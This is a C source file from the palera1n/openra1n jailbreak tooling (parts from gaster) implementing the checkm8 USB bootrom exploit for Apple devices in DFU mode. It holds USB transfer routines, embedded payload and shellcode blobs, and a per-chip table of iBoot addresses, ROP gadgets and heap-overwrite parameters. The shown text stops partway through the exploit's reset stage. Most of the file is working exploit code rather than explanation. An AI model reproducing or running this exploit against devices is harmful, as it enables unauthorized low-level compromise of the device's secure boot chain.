/* Code from openra1n - Copyright 2023 Mineek
 * Some code from gaster - Copyright 2023 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <palerain.h>
#ifdef HAVE_LIBUSB
#include <libusb-1.0/libusb.h>
#include <stdbool.h>
#include <string.h>
#include <stddef.h>
#else
#include <CommonCrypto/CommonCrypto.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOCFPlugIn.h>
#include <IOKit/usb/IOUSBLib.h>
#endif

#ifdef DEBUG
#define log_debug(...) fprintf(stderr, __VA_ARGS__); fputc('\n', stderr)
#else
#define log_debug(...) do {} while (0)
#endif

#define DFU_DNLOAD (1)
#define APPLE_VID (0x5AC)
#define DFU_STATUS_OK (0)
#define DFU_GET_STATUS (3)
#define DFU_CLR_STATUS (4)
#define MAX_BLOCK_SZ (0x50)
#define DFU_MODE_PID (0x1227)
#define DFU_STATE_MANIFEST (7)
#define EP0_MAX_PACKET_SZ (0x40)
#define DFU_FILE_SUFFIX_LEN (16)
#define DFU_MAX_TRANSFER_SZ (0x800)
#define DFU_STATE_MANIFEST_SYNC (6)
#define ARM_16K_TT_L2_SZ (0x2000000U)
#define DFU_STATE_MANIFEST_WAIT_RESET (8)
#define DONE_MAGIC (0x646F6E65646F6E65ULL)
#define EXEC_MAGIC (0x6578656365786563ULL)
#define MEMC_MAGIC (0x6D656D636D656D63ULL)
#define USB_MAX_STRING_DESCRIPTOR_IDX (10)

#ifndef HAVE_LIBUSB
#	if TARGET_OS_IPHONE
#		define kUSBPipeStalled kUSBHostReturnPipeStalled
#	else
#		define kUSBPipeStalled kIOUSBPipeStalled
#	endif
#endif

#ifndef MIN
#	define MIN(a, b) ((a) < (b) ? (a) : (b))
#endif

typedef struct {
	uint16_t vid, pid;
#ifdef HAVE_LIBUSB
	struct libusb_device_handle *device;
#else
	io_service_t serv;
	IOUSBDeviceInterface320 **device;
	CFRunLoopSourceRef async_event_source;
#endif
} usb_handle_t;

typedef bool (*usb_check_cb_t)(usb_handle_t *, void *);

enum usb_transfer {
	USB_TRANSFER_OK,
	USB_TRANSFER_ERROR,
	USB_TRANSFER_STALL
};

typedef struct {
	enum usb_transfer ret;
	uint32_t sz;
} transfer_ret_t;

extern uint8_t payloads_yolo_s8000_bin[], payloads_yolo_s8001_bin[], payloads_yolo_s8003_bin[], payloads_yolo_t7000_bin[], payloads_yolo_t7001_bin[], payloads_yolo_t8010_bin[],  payloads_yolo_t8011_bin[], payloads_yolo_t8015_bin[];
extern unsigned payloads_yolo_s8000_bin_len, payloads_yolo_s8001_bin_len, payloads_yolo_s8003_bin_len, payloads_yolo_t7000_bin_len, payloads_yolo_t7001_bin_len, payloads_yolo_t8010_bin_len, payloads_yolo_t8011_bin_len, payloads_yolo_t8015_bin_len;

extern uint8_t payloads_Pongo_bin[], payloads_shellcode_bin[];
extern unsigned payloads_Pongo_bin_len, payloads_shellcode_bin_len;

#include <payloads/yolo_s8000.bin.h>
#include <payloads/yolo_s8001.bin.h>
#include <payloads/yolo_s8003.bin.h>
#include <payloads/yolo_t7000.bin.h>
#include <payloads/yolo_t7001.bin.h>
#include <payloads/yolo_t8010.bin.h>
#include <payloads/yolo_t8011.bin.h>
#include <payloads/yolo_t8015.bin.h>

#include <payloads/Pongo.bin.h>
#include <payloads/shellcode.bin.h>

static uint16_t cpid;
static uint32_t payload_dest_armv7;
static const char *pwnd_str = " YOLO:checkra1n";
static unsigned usb_timeout, usb_abort_timeout_min;
static struct {
	uint8_t b_len, b_descriptor_type;
	uint16_t bcd_usb;
	uint8_t b_device_class, b_device_sub_class, b_device_protocol, b_max_packet_sz;
	uint16_t id_vendor, id_product, bcd_device;
	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
} device_descriptor;
static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad;
static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, dfu_handle_bus_reset, insecure_memory_base, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;

static void
sleep_ms(unsigned ms) {
#ifdef WIN32
	Sleep(ms);
#else
	struct timespec ts;

	ts.tv_sec = ms / 1000;
	ts.tv_nsec = (ms % 1000) * 1000000L;
	nanosleep(&ts, NULL);
#endif
}

#ifdef HAVE_LIBUSB
static void
close_usb_handle(usb_handle_t *handle) {
	libusb_close(handle->device);
	libusb_exit(NULL);
}

static void
reset_usb_handle(const usb_handle_t *handle) {
	libusb_reset_device(handle->device);
}

static bool
wait_usb_handle(usb_handle_t *handle, usb_check_cb_t usb_check_cb, void *arg) {
	if(libusb_init(NULL) == LIBUSB_SUCCESS) {
		for(;;) {
			if((handle->device = libusb_open_device_with_vid_pid(NULL, handle->vid, handle->pid)) != NULL) {
				if(libusb_set_configuration(handle->device, 1) == LIBUSB_SUCCESS && (usb_check_cb == NULL || usb_check_cb(handle, arg))) {
					return true;
				}
				libusb_close(handle->device);
			}
			sleep_ms(usb_timeout);
		}
	}
	return false;
}

static void
usb_async_cb(struct libusb_transfer *transfer) {
	*(int *)transfer->user_data = 1;
}

static bool
send_usb_control_request(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, transfer_ret_t *transfer_ret) {
	int ret = libusb_control_transfer(handle->device, bm_request_type, b_request, w_value, w_index, p_data, (uint16_t)w_len, usb_timeout);

	if(transfer_ret != NULL) {
		if(ret >= 0) {
			transfer_ret->sz = (uint32_t)ret;
			transfer_ret->ret = USB_TRANSFER_OK;
		} else if(ret == LIBUSB_ERROR_PIPE) {
			transfer_ret->ret = USB_TRANSFER_STALL;
		} else {
			transfer_ret->ret = USB_TRANSFER_ERROR;
		}
	}
	return true;
}

static bool
send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
	struct libusb_transfer *transfer = libusb_alloc_transfer(0);
	struct timeval tv;
	int completed = 0;
	uint8_t *buf;

	if(transfer != NULL) {
		if((buf = malloc(LIBUSB_CONTROL_SETUP_SIZE + w_len)) != NULL) {
			if((bm_request_type & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT) {
				memcpy(buf + LIBUSB_CONTROL_SETUP_SIZE, p_data, w_len);
			}
			libusb_fill_control_setup(buf, bm_request_type, b_request, w_value, w_index, (uint16_t)w_len);
			libusb_fill_control_transfer(transfer, handle->device, buf, usb_async_cb, &completed, usb_timeout);
			if(libusb_submit_transfer(transfer) == LIBUSB_SUCCESS) {
				tv.tv_sec = usb_abort_timeout / 1000;
				tv.tv_usec = (usb_abort_timeout % 1000) * 1000;
				while(completed == 0 && libusb_handle_events_timeout_completed(NULL, &tv, &completed) == LIBUSB_SUCCESS) {
					libusb_cancel_transfer(transfer);
				}
				if(completed != 0) {
					if((bm_request_type & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_IN) {
						memcpy(p_data, libusb_control_transfer_get_data(transfer), transfer->actual_length);
					}
					if(transfer_ret != NULL) {
						transfer_ret->sz = (uint32_t)transfer->actual_length;
						if(transfer->status == LIBUSB_TRANSFER_COMPLETED) {
							transfer_ret->ret = USB_TRANSFER_OK;
						} else if(transfer->status == LIBUSB_TRANSFER_STALL) {
							transfer_ret->ret = USB_TRANSFER_STALL;
						} else {
							transfer_ret->ret = USB_TRANSFER_ERROR;
						}
					}
				}
			}
			free(buf);
		}
		libusb_free_transfer(transfer);
	}
	return completed != 0;
}

static void
init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
	handle->vid = vid;
	handle->pid = pid;
	handle->device = NULL;
}
#else
static void
cf_dictionary_set_int16(CFMutableDictionaryRef dict, const void *key, uint16_t val) {
	CFNumberRef cf_val = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &val);

	if(cf_val != NULL) {
		CFDictionarySetValue(dict, key, cf_val);
		CFRelease(cf_val);
	}
}

static bool
query_usb_interface(io_service_t serv, CFUUIDRef plugin_type, CFUUIDRef interface_type, LPVOID *interface) {
	IOCFPlugInInterface **plugin_interface;
	bool ret = false;
	SInt32 score;

	if(IOCreatePlugInInterfaceForService(serv, plugin_type, kIOCFPlugInInterfaceID, &plugin_interface, &score) == kIOReturnSuccess) {
		ret = (*plugin_interface)->QueryInterface(plugin_interface, CFUUIDGetUUIDBytes(interface_type), interface) == kIOReturnSuccess;
		IODestroyPlugInInterface(plugin_interface);
	}
	IOObjectRelease(serv);
	return ret;
}

static void
close_usb_device(usb_handle_t *handle) {
	CFRunLoopRemoveSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
	CFRelease(handle->async_event_source);
	(*handle->device)->USBDeviceClose(handle->device);
	(*handle->device)->Release(handle->device);
}

static void
close_usb_handle(usb_handle_t *handle) {
	close_usb_device(handle);
}

static bool
open_usb_device(io_service_t serv, usb_handle_t *handle) {
	bool ret = false;

	if(query_usb_interface(serv, kIOUSBDeviceUserClientTypeID, kIOUSBDeviceInterfaceID320, (LPVOID *)&handle->device)) {
		if((*handle->device)->USBDeviceOpen(handle->device) == kIOReturnSuccess) {
			if((*handle->device)->SetConfiguration(handle->device, 1) == kIOReturnSuccess && (*handle->device)->CreateDeviceAsyncEventSource(handle->device, &handle->async_event_source) == kIOReturnSuccess) {
				CFRunLoopAddSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
				ret = true;
			} else {
				(*handle->device)->USBDeviceClose(handle->device);
			}
		}
		if(!ret) {
			(*handle->device)->Release(handle->device);
		}
	}
	return ret;
}

static bool
wait_usb_handle(usb_handle_t *handle, usb_check_cb_t usb_check_cb, void *arg) {
	CFMutableDictionaryRef matching_dict;
	const char *darwin_device_class;
	io_iterator_t iter;
	io_service_t serv;
	bool ret = false;

#if TARGET_OS_IPHONE
	darwin_device_class = "IOUSBHostDevice";
#else
	darwin_device_class = kIOUSBDeviceClassName;
#endif
	while((matching_dict = IOServiceMatching(darwin_device_class)) != NULL) {
		cf_dictionary_set_int16(matching_dict, CFSTR(kUSBVendorID), handle->vid);
		cf_dictionary_set_int16(matching_dict, CFSTR(kUSBProductID), handle->pid);
		if(IOServiceGetMatchingServices(0, matching_dict, &iter) == kIOReturnSuccess) {
			while((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
				if(open_usb_device(serv, handle)) {
					if(usb_check_cb == NULL || usb_check_cb(handle, arg)) {
						ret = true;
						break;
					}
					close_usb_device(handle);
				}
			}
			IOObjectRelease(iter);
			if(ret) {
				break;
			}
			sleep_ms(usb_timeout);
		}
	}
	return ret;
}

static void
reset_usb_handle(usb_handle_t *handle) {
	(*handle->device)->ResetDevice(handle->device);
	(*handle->device)->USBDeviceReEnumerate(handle->device, 0);
}

static void
usb_async_cb(void *refcon, IOReturn ret, void *arg) {
	transfer_ret_t *transfer_ret = refcon;

	if(transfer_ret != NULL) {
		memcpy(&transfer_ret->sz, &arg, sizeof(transfer_ret->sz));
		if(ret == kIOReturnSuccess) {
			transfer_ret->ret = USB_TRANSFER_OK;
		} else if(ret == kUSBPipeStalled) {
			transfer_ret->ret = USB_TRANSFER_STALL;
		} else {
			transfer_ret->ret = USB_TRANSFER_ERROR;
		}
	}
	CFRunLoopStop(CFRunLoopGetCurrent());
}

static bool
send_usb_control_request(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, transfer_ret_t *transfer_ret) {
	IOUSBDevRequestTO req;
	IOReturn ret;

	req.wLenDone = 0;
	req.pData = p_data;
	req.bRequest = b_request;
	req.bmRequestType = bm_request_type;
	req.wLength = OSSwapLittleToHostInt16(w_len);
	req.wValue = OSSwapLittleToHostInt16(w_value);
	req.wIndex = OSSwapLittleToHostInt16(w_index);
	req.completionTimeout = req.noDataTimeout = usb_timeout;
	ret = (*handle->device)->DeviceRequestTO(handle->device, &req);
	if(transfer_ret != NULL) {
		if(ret == kIOReturnSuccess) {
			transfer_ret->sz = req.wLenDone;
			transfer_ret->ret = USB_TRANSFER_OK;
		} else if(ret == kUSBPipeStalled) {
			transfer_ret->ret = USB_TRANSFER_STALL;
		} else {
			transfer_ret->ret = USB_TRANSFER_ERROR;
		}
	}
	return true;
}

static bool
send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
	IOUSBDevRequestTO req;

	req.wLenDone = 0;
	req.pData = p_data;
	req.bRequest = b_request;
	req.bmRequestType = bm_request_type;
	req.wLength = OSSwapLittleToHostInt16(w_len);
	req.wValue = OSSwapLittleToHostInt16(w_value);
	req.wIndex = OSSwapLittleToHostInt16(w_index);
	req.completionTimeout = req.noDataTimeout = usb_timeout;
	if((*handle->device)->DeviceRequestAsyncTO(handle->device, &req, usb_async_cb, transfer_ret) == kIOReturnSuccess) {
		sleep_ms(usb_abort_timeout);
		if((*handle->device)->USBDeviceAbortPipeZero(handle->device) == kIOReturnSuccess) {
			CFRunLoopRun();
			return true;
		}
	}
	return false;
}

static void
init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
	handle->vid = vid;
	handle->pid = pid;
	handle->device = NULL;
}
#endif

static bool
send_usb_control_request_no_data(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, transfer_ret_t *transfer_ret) {
	bool ret = false;
	void *p_data;

	if(w_len == 0) {
		ret = send_usb_control_request(handle, bm_request_type, b_request, w_value, w_index, NULL, 0, transfer_ret);
	} else if((p_data = malloc(w_len)) != NULL) {
		memset(p_data, '\0', w_len);
		ret = send_usb_control_request(handle, bm_request_type, b_request, w_value, w_index, p_data, w_len, transfer_ret);
		free(p_data);
	}
	return ret;
}

static bool
send_usb_control_request_async_no_data(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
	bool ret = false;
	void *p_data;

	if(w_len == 0) {
		ret = send_usb_control_request_async(handle, bm_request_type, b_request, w_value, w_index, NULL, 0, usb_abort_timeout, transfer_ret);
	} else if((p_data = malloc(w_len)) != NULL) {
		memset(p_data, '\0', w_len);
		ret = send_usb_control_request_async(handle, bm_request_type, b_request, w_value, w_index, p_data, w_len, usb_abort_timeout, transfer_ret);
		free(p_data);
	}
	return ret;
}

static char *
get_usb_serial_number(usb_handle_t *handle) {
	transfer_ret_t transfer_ret;
	uint8_t buf[UINT8_MAX];
	char *str = NULL;
	size_t i, sz;

	if(send_usb_control_request(handle, 0x80, 6, 1U << 8U, 0, &device_descriptor, sizeof(device_descriptor), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(device_descriptor) && send_usb_control_request(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 0x409, buf, sizeof(buf), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == buf[0] && (sz = buf[0] / 2) != 0 && (str = malloc(sz)) != NULL) {
		for(i = 0; i < sz; ++i) {
			str[i] = (char)buf[2 * (i + 1)];
		}
		str[sz - 1] = '\0';
	}
	return str;
}

static bool
checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
	char *usb_serial_num = get_usb_serial_number(handle);
	bool ret = false;

	if(usb_serial_num != NULL) {
		if(strstr(usb_serial_num, " SRTG:[iBoot-1145.3]") != NULL) {
			cpid = 0x8950;
			config_large_leak = 659;
			config_overwrite_pad = 0x640;
			memcpy_addr = 0x9ACC;
			aes_crypto_cmd = 0x7301;
			gUSBSerialNumber = 0x10061F80;
			dfu_handle_request = 0x10061A24;
			payload_dest_armv7 = 0x10079800;
			usb_core_do_transfer = 0x7621;
			dfu_handle_bus_reset = 0x10061A3C;
			insecure_memory_base = 0x10000000;
			handle_interface_request = 0x8161;
			usb_create_string_descriptor = 0x7C55;
			usb_serial_number_string_descriptor = 0x100600D8;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1145.3.3]") != NULL) {
			cpid = 0x8955;
			config_large_leak = 659;
			config_overwrite_pad = 0x640;
			memcpy_addr = 0x9B0C;
			aes_crypto_cmd = 0x7341;
			gUSBSerialNumber = 0x10061F80;
			dfu_handle_request = 0x10061A24;
			payload_dest_armv7 = 0x10079800;
			usb_core_do_transfer = 0x7661;
			dfu_handle_bus_reset = 0x10061A3C;
			insecure_memory_base = 0x10000000;
			handle_interface_request = 0x81A1;
			usb_create_string_descriptor = 0x7C95;
			usb_serial_number_string_descriptor = 0x100600D8;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1458.2]") != NULL) {
			cpid = 0x8947;
			config_large_leak = 626;
			config_overwrite_pad = 0x660;
			memcpy_addr = 0x9A3C;
			aes_crypto_cmd = 0x7061;
			gUSBSerialNumber = 0x3402DDF8;
			dfu_handle_request = 0x3402D92C;
			payload_dest_armv7 = 0x34039800;
			usb_core_do_transfer = 0x79ED;
			dfu_handle_bus_reset = 0x3402D944;
			insecure_memory_base = 0x34000000;
			handle_interface_request = 0x7BC9;
			usb_create_string_descriptor = 0x72A9;
			usb_serial_number_string_descriptor = 0x3402C2DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1704.10]") != NULL) {
			cpid = 0x8960;
			config_large_leak = 7936;
			config_overwrite_pad = 0x5C0;
			patch_addr = 0x100005CE0;
			memcpy_addr = 0x10000ED50;
			aes_crypto_cmd = 0x10000B9A8;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180086CDC;
			dfu_handle_request = 0x180086C70;
			usb_core_do_transfer = 0x10000CC78;
			dfu_handle_bus_reset = 0x180086CA0;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000CFB4;
			usb_create_string_descriptor = 0x10000BFEC;
			usb_serial_number_string_descriptor = 0x180080562;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL) {
			cpid = 0x7001;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000AD04;
			memcpy_addr = 0x100013F10;
			aes_crypto_cmd = 0x100010A90;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180088E48;
			dfu_handle_request = 0x180088DF8;
			usb_core_do_transfer = 0x100011BB4;
			dfu_handle_bus_reset = 0x180088E18;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x100011EE4;
			usb_create_string_descriptor = 0x100011074;
			usb_serial_number_string_descriptor = 0x180080C2A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
			cpid = 0x7000;
			config_overwrite_pad = 0x500;
			patch_addr = 0x100007E98;
			memcpy_addr = 0x100010E70;
			aes_crypto_cmd = 0x10000DA90;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x1800888C8;
			dfu_handle_request = 0x180088878;
			usb_core_do_transfer = 0x10000EBB4;
			dfu_handle_bus_reset = 0x180088898;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000EEE4;
			usb_create_string_descriptor = 0x10000E074;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2098.0.0.2.4]") != NULL) {
			cpid = 0x7002;
			config_overwrite_pad = 0x500;
			memcpy_addr = 0x89F4;
			aes_crypto_cmd = 0x6341;
			gUSBSerialNumber = 0x46005958;
			dfu_handle_request = 0x46005898;
			payload_dest_armv7 = 0x46007800;
			usb_core_do_transfer = 0x6E59;
			dfu_handle_bus_reset = 0x460058B0;
			insecure_memory_base = 0x46018000;
			handle_interface_request = 0x7081;
			usb_create_string_descriptor = 0x6745;
			usb_serial_number_string_descriptor = 0x4600034A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
			cpid = 0x8003;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			dfu_handle_bus_reset = 0x180087928;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
			cpid = 0x8000;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			dfu_handle_bus_reset = 0x180087928;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2481.0.0.2.1]") != NULL) {
			cpid = 0x8001;
			config_hole = 6;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000404;
			nop_gadget = 0x10000CD60;
			ret_gadget = 0x100000118;
			patch_addr = 0x100007668;
			ttbr0_addr = 0x180050000;
			func_gadget = 0x10000CD40;
			write_ttbr0 = 0x1000003B4;
			memcpy_addr = 0x1000106F0;
			aes_crypto_cmd = 0x10000C9D4;
			boot_tramp_end = 0x180044000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180047578;
			dfu_handle_request = 0x18004C378;
			usb_core_do_transfer = 0x10000DDA4;
			dfu_handle_bus_reset = 0x18004C3A8;
			insecure_memory_base = 0x180000000;
			handle_interface_request = 0x10000E0B4;
			usb_create_string_descriptor = 0x10000D280;
			usb_serial_number_string_descriptor = 0x18004486A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2651.0.0.1.31]") != NULL) {
			cpid = 0x8002;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			memcpy_addr = 0xB6F8;
			aes_crypto_cmd = 0x86DD;
			gUSBSerialNumber = 0x48802AB8;
			dfu_handle_request = 0x48806344;
			payload_dest_armv7 = 0x48806E00;
			usb_core_do_transfer = 0x9411;
			dfu_handle_bus_reset = 0x4880635C;
			insecure_memory_base = 0x48818000;
			handle_interface_request = 0x95F1;
			usb_create_string_descriptor = 0x8CA5;
			usb_serial_number_string_descriptor = 0x4880037A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2651.0.0.3.3]") != NULL) {
			cpid = 0x8004;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			memcpy_addr = 0xA884;
			aes_crypto_cmd = 0x786D;
			gUSBSerialNumber = 0x48802AE8;
			dfu_handle_request = 0x48806384;
			payload_dest_armv7 = 0x48806E00;
			usb_core_do_transfer = 0x85A1;
			dfu_handle_bus_reset = 0x4880639C;
			insecure_memory_base = 0x48818000;
			handle_interface_request = 0x877D;
			usb_create_string_descriptor = 0x7E35;
			usb_serial_number_string_descriptor = 0x488003CA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2696.0.0.1.33]") != NULL) {
			cpid = 0x8010;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000434;
			nop_gadget = 0x10000CC6C;
			ret_gadget = 0x10000015C;
			patch_addr = 0x1000074AC;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CC4C;
			write_ttbr0 = 0x1000003E4;
			memcpy_addr = 0x100010730;
			aes_crypto_cmd = 0x10000C8F4;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083CF8;
			dfu_handle_request = 0x180088B48;
			usb_core_do_transfer = 0x10000DC98;
			dfu_handle_bus_reset = 0x180088B78;
			insecure_memory_base = 0x1800B0000;
			handle_interface_request = 0x10000DFB8;
			usb_create_string_descriptor = 0x10000D150;
			usb_serial_number_string_descriptor = 0x1800805DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3135.0.0.2.3]") != NULL) {
			cpid = 0x8011;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000444;
			nop_gadget = 0x10000CD0C;
			ret_gadget = 0x100000148;
			patch_addr = 0x100007630;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CCEC;
			write_ttbr0 = 0x1000003F4;
			memcpy_addr = 0x100010950;
			aes_crypto_cmd = 0x10000C994;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083D28;
			dfu_handle_request = 0x180088A58;
			usb_core_do_transfer = 0x10000DD64;
			dfu_handle_bus_reset = 0x180088A88;
			insecure_memory_base = 0x1800B0000;
			handle_interface_request = 0x10000E08C;
			usb_create_string_descriptor = 0x10000D234;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3332.0.0.1.23]") != NULL) {
			cpid = 0x8015;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x1000004AC;
			nop_gadget = 0x10000A9C4;
			ret_gadget = 0x100000148;
			patch_addr = 0x10000624C;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x10000A9AC;
			write_ttbr0 = 0x10000045C;
			memcpy_addr = 0x10000E9D0;
			aes_crypto_cmd = 0x100009E9C;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003A78;
			dfu_handle_request = 0x180008638;
			usb_core_do_transfer = 0x10000B9A8;
			dfu_handle_bus_reset = 0x180008668;
			insecure_memory_base = 0x18001C000;
			handle_interface_request = 0x10000BCCC;
			usb_create_string_descriptor = 0x10000AE80;
			usb_serial_number_string_descriptor = 0x1800008FA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3401.0.0.1.16]") != NULL) {
			cpid = 0x8012;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000494;
			nop_gadget = 0x100008DB8;
			ret_gadget = 0x10000012C;
			patch_addr = 0x100004854;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x100008DA0;
			write_ttbr0 = 0x100000444;
			memcpy_addr = 0x10000EA30;
			aes_crypto_cmd = 0x1000082AC;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003AF8;
			dfu_handle_request = 0x180008B08;
			usb_core_do_transfer = 0x10000BD20;
			dfu_handle_bus_reset = 0x180008B38;
			insecure_memory_base = 0x18001C000;
			handle_interface_request = 0x10000BFFC;
			usb_create_string_descriptor = 0x10000B1CC;
			usb_serial_number_string_descriptor = 0x18000082A;
		}
		if(cpid != 0) {
			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
			ret = true;
		}
		free(usb_serial_num);
	}
	return ret;
}

static bool
dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
	struct {
		uint8_t status, poll_timeout[3], state, str_idx;
	} dfu_status;
	transfer_ret_t transfer_ret;

	return send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status) && dfu_status.status == status && dfu_status.state == state;
}

static bool
dfu_set_state_wait_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 0 && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC) && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST) && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
}

static bool
checkm8_stage_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN && dfu_set_state_wait_reset(handle) && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == EP0_MAX_PACKET_SZ) {
		return true;
	}
